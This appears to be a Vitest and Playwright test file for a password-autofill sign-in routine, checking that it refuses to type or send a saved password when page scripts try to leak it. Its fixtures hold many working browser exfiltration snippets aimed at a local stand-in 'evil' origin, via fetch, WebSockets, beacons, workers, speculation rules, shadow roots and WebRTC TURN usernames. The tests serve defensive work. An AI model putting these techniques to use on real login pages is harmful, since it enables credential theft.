import { createHash } from "node:crypto";
import { createSocket } from "node:dgram";
import { once } from "node:events";
import type { IncomingMessage, ServerResponse } from "node:http";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import type { Duplex } from "node:stream";

import type { Page as WorkerPage } from "@cloudflare/playwright";
import type { Browser, BrowserContext, Page } from "playwright";
import { chromium } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { signIn } from "./login";

const SAVED_SECRET = "s3cret-pw";

interface Hit {
    body: string;
    method: string;
    url: string;
}

type Handler = (request: IncomingMessage, response: ServerResponse, body: string) => void;

/** A local site on its own host, so two of them are two origins. Records every request with its body, and every WebSocket it accepts and each frame sent on one. */
const site = async (host: string, handler: Handler) => {
    const hits: Hit[] = [];
    const server = createServer((request, response) => {
        let body = "";

        request.on("data", (chunk: Buffer) => {
            body += chunk.toString();
        });
        request.on("end", () => {
            hits.push({ body, method: request.method ?? "", url: request.url ?? "" });
            handler(request, response, body);
        });
    });

    server.on("upgrade", (request: IncomingMessage, socket: Duplex) => {
        hits.push({ body: "", method: "WEBSOCKET", url: request.url ?? "" });
        // The low four bits of a frame's first byte: 1 is text, 8 is a close.
        socket.on("data", (frame: Buffer) => {
            hits.push({ body: "", method: `FRAME ${(frame[0] ?? 0) & 0x0f}`, url: request.url ?? "" });
        });
        socket.write(
            // eslint-disable-next-line sonarjs/hashing -- the WebSocket handshake is defined with SHA-1
            `HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1")
                .update(`${request.headers["sec-websocket-key"] ?? ""}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
                .digest("base64")}\r\n\r\n`,
        );
    });
    server.listen(0, host);
    await once(server, "listening");

    return { close: () => server.close(), hits, origin: `http://${host}:${(server.address() as AddressInfo).port}` };
};

const html = (response: ServerResponse, markup: string): void => {
    response.setHeader("content-type", "text/html");
    response.end(`<!doctype html><title>Sign in</title>${markup}`);
};

/** The two fields of every login page here: a username and a password. */
const FIELDS = `<input name="user"><input name="pw" type="password">`;

const loginForm = (script = "", attributes = 'method="post" action="/session"'): string =>
    `<form ${attributes}>${FIELDS}<button>Go</button></form><script>${script}</script>`;

describe(signIn, () => {
    let browser: Browser;
    let context: BrowserContext;
    let page: Page;
    let evil: Awaited<ReturnType<typeof site>>;
    let login: Awaited<ReturnType<typeof site>>;
    /** What the login site serves at `/` and answers at `/session`; each case sets them. */
    const fixture: {
        evil: string;
        headers: Record<string, string>;
        home: string;
        onMoved: (response: ServerResponse) => void;
        onSession: Handler;
        page: string;
        popup: string;
        rules: string;
        worker: string;
    } = {
        evil: "",
        headers: {},
        home: "",
        onMoved: (response) => response.end(),
        onSession: () => undefined,
        page: "",
        popup: "",
        rules: "",
        worker: "",
    };
    /** Every UDP datagram the other site's address receives: where WebRTC talks to a TURN server. */
    const datagrams: string[] = [];
    const udp = createSocket("udp4", (message) => {
        datagrams.push(message.toString("latin1"));
    });
    let turn = "";

    beforeAll(async () => {
        // Cross-site frames in their own process, as with site isolation: each is a target of its own.
        browser = await chromium.launch({ args: ["--site-per-process"] });
        evil = await site("127.0.0.2", (request, response) => (request.url === "/relay" ? html(response, fixture.evil) : response.end("ok")));
        await new Promise<void>((resolve) => {
            udp.bind(0, "127.0.0.2", resolve);
        });
        turn = `turn:127.0.0.2:${udp.address().port}`;
        login = await site("127.0.0.1", (request, response, body) => {
            switch (request.url?.split("?", 1)[0]) {
                case "/home": {
                    html(response, fixture.home);
                    break;
                }
                case "/moved.png": {
                    fixture.onMoved(response);
                    break;
                }
                case "/popup": {
                    html(response, fixture.popup);
                    break;
                }
                case "/rules.json": {
                    response.setHeader("content-type", "application/speculationrules+json");
                    response.end(fixture.rules);
                    break;
                }
                case "/session": {
                    fixture.onSession(request, response, body);
                    break;
                }
                case "/worker.js": {
                    response.setHeader("content-type", "text/javascript");
                    response.end(fixture.worker);
                    break;
                }
                default: {
                    for (const [name, value] of Object.entries(fixture.headers)) {
                        response.setHeader(name, value);
                    }

                    html(response, fixture.page);
                }
            }
        });
    });

    afterAll(async () => {
        await browser.close();
        evil.close();
        login.close();
        udp.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
        evil.hits.length = 0;
        login.hits.length = 0;
        fixture.headers = {};
        datagrams.length = 0;
        fixture.home = "<h1>Home</h1>";
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/home" });
            response.end();
        };
    });

    afterEach(async () => {
        await context.close();
    });

    const run = async (now: () => number = Date.now) =>
        signIn(
            // The Worker's fork of the same API; its types differ only in a few narrower overloads.
            page as unknown as WorkerPage,
            {
                deadline: Date.now() + 30_000,
                navTimeout: 10_000,
                now,
                origin: login.origin,
                pageTimeout: 5000,
                password: SAVED_SECRET,
                url: `${login.origin}/`,
                username: "ann",
            },
        );

    const passwordLeft = async (): Promise<boolean> =>
        page.evaluate((secret) => [...document.querySelectorAll("input")].some((input) => input.value === secret), SAVED_SECRET);

    /** Whether a sign-in that typed nothing left the tab on a blank page, with the lock lifted from it. */
    const leftBlank = async (): Promise<boolean> =>
        page.url() === "about:blank" && (await page.evaluate(() => typeof RTCPeerConnection === "function" && typeof Worker === "function"));

    const sessionPosts = (): Hit[] => login.hits.filter((hit) => hit.url === "/session");

    it("sends the form by POST to the login's origin and reports where it landed", async () => {
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
        // The lock is lifted with the cleanup: the page the session goes on with has WebRTC and runs workers.
        const workerRan = await page.evaluate(
            async () =>
                new Promise((resolve) => {
                    const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(true)"])));

                    worker.addEventListener("message", (event) => resolve(event.data));
                }),
        );

        expect(workerRan).toBe(true);
        expect(await page.evaluate(() => typeof RTCPeerConnection)).toBe("function");
    });

    it.each([
        ["as the password is typed", `document.forms[0].pw.addEventListener("input", () => { document.forms[0].action = "EVIL/steal"; });`],
        ["in its submit handler", `document.forms[0].addEventListener("submit", () => { document.forms[0].action = "EVIL/steal"; });`],
    ])("does not send a form whose action a script moves to another site %s", async (_when, script) => {
        fixture.page = loginForm(script.replace("EVIL", () => evil.origin));

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("blocks a submit handler that posts the password to another site, and clears the field", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("${evil.origin}/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("keeps blocking after a decoy request and a same-document navigation", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/beacon", { body: "event=submit", method: "POST" }); history.pushState({}, "", "/next"); fetch("EVIL/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`.replace(
                "EVIL",
                () => evil.origin,
            ),
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("does not count a same-origin request without the password as the form being sent", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("/beacon", { body: "event=submit", method: "POST" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it.each([
        [
            "by fetch as JSON",
            `fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" });`,
        ],
        ["with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
        [
            "on a WebSocket",
            `const socket = new WebSocket("WS/socket"); socket.onopen = () => socket.send(JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }));`,
        ],
    ])("reports a script that signs in %s as a sign-in it cannot fill, and sends nothing", async (_how, send) => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send.replace("WS", () => login.origin.replace("http", "ws"))} });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("signs in with a script"), scriptSignIn: true, submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.method === "POST" || hit.method === "FRAME 1")).toStrictEqual([]);
    });

    it("signs in when a submit handler writes a blank frame's document first", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => { const frame = document.createElement("iframe"); document.body.append(frame); frame.contentDocument.open(); frame.contentDocument.write("<p>widget</p>"); frame.contentDocument.close(); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
    });

    it("gives page scripts only a stand-in, however they read the field, and sends the password in the form's own POST", async () => {
        const seen: string[] = [];

        await page.exposeFunction("seen", (values: string[]) => {
            seen.push(...values);
        });
        fixture.page = loginForm(
            `const form = document.forms[0]; const field = form.pw; const read = []; let keys = "";
            for (const type of ["beforeinput", "input", "compositionend"]) field.addEventListener(type, (event) => read.push(event.data ?? ""));
            field.addEventListener("keydown", (event) => { keys += event.key; });
            form.addEventListener("submit", () => {
                const frame = document.createElement("iframe"); document.body.append(frame);
                read.push(keys, field.value, form.elements.pw.value, String(new FormData(form).get("pw")), field.getAttribute("value") ?? "", Object.getOwnPropertyDescriptor(frame.contentWindow.HTMLInputElement.prototype, "value").get.call(field), structuredClone(field.value));
                field.setSelectionRange(0, field.value.length); read.push(field.value.slice(field.selectionStart, field.selectionEnd));
                for (const value of read) for (const rel of ["preconnect", "dns-prefetch"]) document.head.append(Object.assign(document.createElement("link"), { href: "http://" + encodeURIComponent(value || "empty") + ".invalid", rel }));
                window.seen(read);
            });`,
        );

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(seen.filter((value) => value.length >= 16)).not.toHaveLength(0);
        expect(seen.filter((value) => value.includes(SAVED_SECRET))).toStrictEqual([]);
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it.each([
        [
            "copies the stand-in into the username field",
            `document.forms[0].addEventListener("submit", () => { document.forms[0].user.value = document.forms[0].pw.value; });`,
        ],
        [
            "posts it in a form of its own to another address of the site",
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const form = Object.assign(document.createElement("form"), { action: "/profile", method: "post" }); form.append(Object.assign(document.createElement("input"), { name: "pw", value: document.forms[0].pw.value })); document.body.append(form); form.submit(); });`,
        ],
    ])("sends no password when the page %s", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.body.includes(SAVED_SECRET))).toStrictEqual([]);
    });

    it("runs no script of the sign-in's answer, which could read what the site shows of it", async () => {
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><script>fetch("/ran");</script>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        // The answer and the cleanup's look at it, both without scripts, then the load the session goes on with.
        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home", "/home", "/home", "/ran"]);
    });

    it("sends the password in a multipart form's own POST", async () => {
        fixture.page = loginForm("", 'method="post" action="/session" enctype="multipart/form-data"');

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()[0]?.body).toContain(`name="pw"\r\n\r\n${SAVED_SECRET}\r\n`);
    });

    it("signs in when an image of the login's site redirects to another site by 307", async () => {
        fixture.page = loginForm(
            `document.forms[0].pw.addEventListener("input", () => document.body.append(Object.assign(document.createElement("img"), { src: "/moved.png" })));`,
        );
        fixture.onMoved = (response) => {
            response.writeHead(307, { location: `${evil.origin}/cdn.png` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(login.hits.some((hit) => hit.url === "/moved.png")).toBe(true);
    });

    it("waits for a slow server's answer before it reports where the form landed", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            setTimeout(() => {
                response.writeHead(303, { location: "/home" });
                response.end();
            }, 2500);
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("types nothing into a form that would post from another window", async () => {
        fixture.page = loginForm("", 'method="post" action="/session" target="_blank"');

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("signs in when the page it lands on embeds another site", async () => {
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><iframe src="${evil.origin}/widget"></iframe>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(evil.hits.filter((hit) => hit.body !== "")).toStrictEqual([]);
    });

    it("reports a login page shown again as a password field that remains", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ passwordFieldRemains: true, submitted: true, success: true });
    });

    it("types nothing into a form that a base element sends to another window", async () => {
        fixture.page = `<base target="_blank">${loginForm()}`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("blocks a form a submit handler sends to another window", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", () => { document.forms[0].target = "_blank"; });`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it.each([
        [307, "to another site", () => `${evil.origin}/steal`],
        [308, "to another site", () => `${evil.origin}/steal`],
        // The browser takes this address; a strict URL parser does not.
        // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
        [307, "whose address does not parse", () => "http://a b/"],
    ])("fails a %i redirect %s, and reports the form as sent", async (status, _where, location) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(status, { location: location() });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: true, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("sends the form from its first enabled submit button, an image one, with that button's address", async () => {
        fixture.page = `<form method="post" action="/elsewhere">${FIELDS}<button disabled formaction="/disabled">Go</button><input type="image" alt="Go" formaction="/session"></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}&x=0&y=0`, method: "POST", url: "/session" }]);
    });

    it("clears the password when the page throws after it was typed", async () => {
        fixture.page = loginForm(`HTMLFormElement.prototype.requestSubmit = () => { throw new Error("broken"); };`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(result).not.toHaveProperty("sessionClosed");
        expect(await passwordLeft()).toBe(false);
    });

    it("reports a form the page held back as not sent", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => event.preventDefault());`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
        expect(await passwordLeft()).toBe(false);
    });

    it("types nothing into a password field outside a form", async () => {
        fixture.page = FIELDS;

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("reports a sign-in whose answer fails to load as sent, not signed in", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            // A redirect the browser itself refuses to follow.
            // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
            response.writeHead(307, { location: "http://[" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not load"), submitted: true, success: false });
    });

    it("closes the page and the session when the hold ends after the password was typed", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", () => window.endHold());`);

        const result = await run(() => Date.now() + offset);

        expect(result).toMatchObject({ sessionClosed: true, submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(page.isClosed()).toBe(true);
    });

    it("closes the page rather than clear it past the hold when the sign-in lands at its end", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm();
        // The answer runs no script: the site ends the hold as it serves it.
        Object.defineProperty(fixture, "home", {
            configurable: true,
            get: () => {
                offset = 60_000;

                return "<h1>Home</h1>";
            },
        });

        const result = await run(() => Date.now() + offset);

        Reflect.deleteProperty(fixture, "home");

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it.each([
        ["as the form sent it", (body: string) => `/home?${body}`],
        ["in another spelling", () => `/home?echo=${encodeURIComponent(SAVED_SECRET).toLowerCase()}`],
        ["encoded twice", () => `/home?returnTo=${[...SAVED_SECRET].map((character) => `%25${character.codePointAt(0)?.toString(16)}`).join("")}`],
        ["as its user info", () => `${login.origin.replace("//", () => `//ann:${SAVED_SECRET}@`)}/home`],
    ])("fails a redirect of the sign-in that echoes the password into the address %s", async (_how, location) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            response.writeHead(303, { location: location(body) });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("the password in an address"), submitted: true, success: false });
        expect(login.hits.filter((hit) => hit.url.startsWith("/home"))).toStrictEqual([]);
        expect(page.url()).not.toContain(SAVED_SECRET);
    });

    it.each([
        ["switches the form to GET", `document.forms[0].addEventListener("submit", () => { document.forms[0].method = "get"; });`],
        [
            "navigates with it in the address",
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); location.href = "/next?pw=" + encodeURIComponent(document.forms[0].pw.value); });`,
        ],
    ])("blocks a same-origin request that carries the password in its address when a submit handler %s", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in an address"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
    });

    it("closes the session, and runs none of its script, when the reloaded page shows the password as text", async () => {
        let echoed = "";

        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            echoed = new URLSearchParams(body).get("pw") ?? "";
            response.writeHead(303, { location: "/home" });
            response.end();
        };
        // The site renders what it was sent, as a page could from its own records.
        Object.defineProperty(fixture, "home", {
            configurable: true,
            get: () =>
                `<p>Signed in with ${echoed}</p><script>fetch("${evil.origin}/steal", { body: document.body.textContent, method: "POST", mode: "no-cors" });</script>`,
        });

        const result = await run();

        Reflect.deleteProperty(fixture, "home");

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
        expect(evil.hits).toStrictEqual([]);
    });

    it.each([
        ["points the form at another address of the site", `document.forms[0].action = "/profile";`],
        ["renames the password field", `document.forms[0].pw.name = "bio";`],
    ])("types nothing when a script of the page %s before it is filled", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("A script changed where"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("types nothing into a login form a script builds", async () => {
        fixture.page = `<div id="app"></div><script>document.querySelector("#app").innerHTML = ${JSON.stringify(loginForm()).replaceAll("</", String.raw`<\/`)};</script>`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("built by a script"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("does not count a beacon of the whole form as the sign-in", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.sendBeacon("/beacon", new FormData(document.forms[0])); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it.each([
        ["to another site", () => `${evil.origin.replace("http", "ws")}/steal?`],
        ["with it in the path to the login's own site", () => `${login.origin.replace("http", "ws")}/socket/`],
    ])("refuses a WebSocket %s while the password is in the page", async (_where, address) => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${address()}" + document.forms[0].pw.value); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
        expect([...evil.hits, ...login.hits].filter((hit) => hit.method === "WEBSOCKET")).toStrictEqual([]);
    });

    it("closes a WebSocket to another site the page opened before the password was typed", async () => {
        fixture.page = loginForm(
            `const socket = new WebSocket("${evil.origin.replace("http", "ws")}/live"); document.forms[0].addEventListener("submit", () => { try { socket.send(document.forms[0].pw.value); } catch {} });`,
        );
        // The page is only filled once its socket is open.
        fixture.page += `<script>document.forms[0].pw.type = "text"; new Promise((resolve) => setTimeout(resolve, 300)).then(() => { document.forms[0].pw.type = "password"; });</script>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(evil.hits.map((hit) => hit.method).filter((method) => method !== "FRAME 8")).toStrictEqual(["WEBSOCKET"]);
    });

    /** A worker's script that sends what it is handed to the other site on a WebSocket and by POST. */
    const exfiltrate = (): string =>
        `const send = (data) => { new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + data); fetch("${evil.origin}/steal", { body: data, method: "POST", mode: "no-cors" }); };`;
    const onSubmit = (body: string, before = ""): string =>
        loginForm(
            `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const pw = document.forms[0].pw.value; ${body} });`,
        );
    /** Rules that prefetch every link in the document as soon as it is there. */
    const EVERY_LINK = `{"prefetch":[{"eagerness":"immediate","source":"document"}]}`;
    const linkTo = (origin: string): string => `const link = document.createElement("a"); link.href = "${origin}/steal?" + pw; document.body.append(link);`;
    /** A script element of rules that prefetch and prerender an address on `origin` carrying `pw`. */
    const speculationRules = (origin: string): string =>
        `Object.assign(document.createElement("script"), { textContent: JSON.stringify({ prefetch: [{ source: "list", urls: ["${origin}/steal?" + pw] }], prerender: [{ source: "list", urls: ["${origin}/render?" + pw] }] }), type: "speculationrules" })`;
    /** Markup, as a script expression, of a closed declarative shadow root holding rules that prefetch every link, and a link on `origin` carrying `pw`. */
    const closedRules = (origin: string): string =>
        `'<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</' + 'script></template></div><a href="${origin}/steal?' + encodeURIComponent(pw) + '">x</a>'`;
    const blobWorker = (realm: string): string =>
        `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${JSON.stringify(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;

    it("sees the form's POST past a service worker that would answer it itself", async () => {
        fixture.page = loginForm();
        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("fetch", (event) => { if (event.request.method === "POST") event.respondWith(new Response("held")); });`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it.each([
        ["a message", "navigator.serviceWorker.ready.then((registration) => registration.active.postMessage(pw));"],
        ["a broadcast", `new BroadcastChannel("out").postMessage(pw);`],
    ])("gives a service worker no way to the password by %s", async (_how, send) => {
        fixture.page = onSubmit(send);
        fixture.worker = `${exfiltrate()} self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => send(event.data)); new BroadcastChannel("out").onmessage = (event) => send(event.data);`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it.each([
        [
            "a worker started with the page",
            () => {
                return {
                    page: onSubmit("worker.postMessage(pw);", `const worker = new Worker("/worker.js");`),
                    worker: `${exfiltrate()} onmessage = (event) => send(event.data);`,
                };
            },
        ],
        [
            "a shared worker",
            () => {
                return {
                    page: onSubmit(`new SharedWorker("/worker.js").port.postMessage(pw);`),
                    worker: `${exfiltrate()} onconnect = (event) => { event.ports[0].onmessage = (message) => send(message.data); };`,
                };
            },
        ],
        [
            "a blob worker",
            () => {
                return { page: onSubmit(blobWorker("window")) };
            },
        ],
        [
            "a worker of a blank frame's realm",
            () => {
                return { page: onSubmit(`const frame = document.createElement("iframe"); document.body.append(frame); ${blobWorker("frame.contentWindow")}`) };
            },
        ],
        [
            "a WebSocketStream",
            () => {
                return { page: onSubmit(`new WebSocketStream("${evil.origin.replace("http", "ws")}/steal?" + pw);`) };
            },
        ],
        [
            "fetchLater",
            () => {
                return { page: onSubmit(`fetchLater("${evil.origin}/steal", { activateAfter: 0, body: pw, method: "POST" });`) };
            },
        ],
        [
            "a keepalive fetch as the page unloads",
            () => {
                return {
                    page: loginForm(
                        `addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { keepalive: true, mode: "no-cors" }));`,
                    ),
                };
            },
        ],
        [
            "a keepalive fetch whose options change as they are read",
            () => {
                return {
                    page: loginForm(
                        `let reads = 0; addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { get keepalive() { reads += 1; return reads > 1; }, mode: "no-cors" }));`,
                    ),
                };
            },
        ],
        [
            "a beacon as the page unloads",
            () => {
                return { page: loginForm(`addEventListener("pagehide", () => navigator.sendBeacon("${evil.origin}/steal", document.forms[0].pw.value));`) };
            },
        ],
        [
            "a link prefetch",
            () => {
                return {
                    page: onSubmit(
                        `const link = document.createElement("link"); link.rel = "prefetch"; link.href = "${evil.origin}/steal?" + pw; document.head.append(link);`,
                    ),
                };
            },
        ],
        [
            "document speculation rules in the page, through a link a script adds",
            () => {
                return { page: `<script type="speculationrules">${EVERY_LINK}</script>${onSubmit(linkTo(evil.origin))}` };
            },
        ],
        [
            "document speculation rules from a Speculation-Rules header, through a link a script adds",
            () => {
                return { headers: { "speculation-rules": '"/rules.json"' }, page: onSubmit(linkTo(evil.origin)), rules: EVERY_LINK };
            },
        ],
        [
            "document speculation rules in a declarative shadow root, through a link a script adds",
            () => {
                return {
                    page: `<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</script></template></div>${onSubmit(linkTo(evil.origin))}`,
                };
            },
        ],
        [
            "speculation rules a script adds",
            () => {
                return { page: onSubmit(`document.head.append(${speculationRules(evil.origin)});`) };
            },
        ],
        [
            "speculation rules whose type a script changes once they are in",
            () => {
                return { page: onSubmit(`const rules = ${speculationRules(evil.origin)}; document.head.append(rules); rules.type = "text/plain";`) };
            },
        ],
        [
            "speculation rules a script writes into the parsed page in a declarative shadow root",
            () => {
                return { page: onSubmit(`document.open(); document.write(${closedRules(evil.origin)}); document.close();`) };
            },
        ],
        [
            "a page of its own markup it opens in the tab, with speculation rules in a declarative shadow root",
            () => {
                return { page: onSubmit(`location.href = URL.createObjectURL(new Blob([${closedRules(evil.origin)}], { type: "text/html" }));`) };
            },
        ],
        [
            "speculation rules in a shadow root a removed frame's realm attached",
            () => {
                return {
                    page: onSubmit(
                        `const frame = document.createElement("iframe"); document.body.append(frame); const host = document.createElement("div"); document.body.append(host); const shadow = frame.contentWindow.Element.prototype.attachShadow.call(host, { mode: "closed" }); frame.remove(); shadow.append(${speculationRules(evil.origin)});`,
                    ),
                };
            },
        ],
        [
            "speculation rules a script adds in a closed shadow root",
            () => {
                return {
                    page: onSubmit(
                        `const host = document.createElement("div"); document.body.append(host); host.attachShadow({ mode: "closed" }).append(${speculationRules(evil.origin)});`,
                    ),
                };
            },
        ],
    ])("gives %s no way out with the password", async (_what, make) => {
        Object.assign(fixture, make());

        await run();

        expect(evil.hits).toStrictEqual([]);
    });

    it("gives a worker of a cross-site frame the page hands the password to no way out", async () => {
        // The frame says it runs, and whether its Worker is the browser's own.
        fixture.evil = `<script>parent.postMessage(String(Function.prototype.toString.call(Worker).includes("native")), "*"); onmessage = (event) => { const pw = event.data; ${blobWorker("window")} };</script>`;
        fixture.page = `<iframe src="${evil.origin}/relay"></iframe>${onSubmit(`frames[0].postMessage(pw, "*");`, `addEventListener("message", (event) => fetch("/alive?native=" + event.data), { once: true });`)}`;

        await run();

        // The first load, under the lock; the cleanup's reload, after it, runs the frame again.
        expect(login.hits.find((hit) => hit.url.startsWith("/alive"))).toStrictEqual({ body: "", method: "GET", url: "/alive?native=false" });
        expect(evil.hits.filter((hit) => hit.url !== "/relay")).toStrictEqual([]);
    });

    const rtc = (from: string): string =>
        `const connection = new ${from}.RTCPeerConnection({ iceServers: [{ credential: "x", urls: "${turn}", username: pw }] }); connection.createDataChannel("out"); connection.createOffer().then((offer) => connection.setLocalDescription(offer));`;

    it.each([
        ["the page", () => rtc("window")],
        ["a blank frame's realm", () => `const frame = document.createElement("iframe"); document.body.append(frame); ${rtc("frame.contentWindow")}`],
    ])("refuses WebRTC from %s while the password is in it", async (_where, send) => {
        fixture.page = onSubmit(send());

        await run();

        expect(datagrams).toStrictEqual([]);
    });

    it("closes a window the page opened before the password was typed, before it runs", async () => {
